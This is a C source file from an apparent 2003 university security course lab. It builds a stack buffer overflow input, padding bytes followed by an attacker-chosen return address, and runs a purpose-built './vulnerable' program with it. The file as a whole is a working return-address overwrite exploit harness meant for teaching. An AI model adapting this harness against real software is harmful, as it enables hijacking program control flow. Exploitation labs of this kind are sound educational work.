/* 
 *
 * $Id: wrap.c,v 1.5 2003/09/15 17:31:49 jason Exp $
 *
 * see end of file for copyright info
 *
 */

#include<stdio.h>
#include<string.h>
#include<unistd.h>
#include<stdlib.h>

#include "lab7.h"

int main(int argc, char **argv)
{
	char *newargv[3];
	char *arg1;
	char *ptr;
	unsigned int i;
	unsigned int target_addr;
	unsigned int distance_to_ret;

	/*
	 * get command line
	 */
	if(argc != 3)
	{
		ptr = rindex(argv[0], '/');
		if(!ptr)
			ptr = argv[0];
		fprintf(stderr, "Usage: %s distance_to_ret target_address\n"
				"	Start numbers with 0x for hexadecimal, 0 for octal and and nothing for\n"
				"	decimal.\n", ptr);
		exit(1);
	}
	distance_to_ret = strtoul(argv[1],NULL,0);
	target_addr = strtoul(argv[2],NULL,0);

	/*
	 * allocate buffer
	 */
	arg1 = (char *)alloca(buffer_size + distance_to_ret + sizeof(void *) + 1);
	if(!arg1)
	{
		perror("failed to allocate memory");
		exit(2);
	}

	ptr = arg1;
	/* section 1 */
	for(i=0;i<buffer_size + distance_to_ret;i++)
		*(ptr++) = 'x';
	/* section 2 */
	*((unsigned int *)ptr) = target_addr;
	ptr+=4;
	/* section 3 */
	*(ptr++) = '\0';

	/*
	 * execute test program
	 */
	newargv[0] = prog_path;
	newargv[1] = arg1;
	newargv[2] = NULL;
	execv("./vulnerable", newargv);
	perror("failed to exec");
	exit(3);
}
/* This file is part of BYU CS 465 Lab 1.
 *
 * Copyright 2003 Ed schaller <schallee@darkmist.net>
 *
 * This lab is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * lab1 is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with lab1; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */
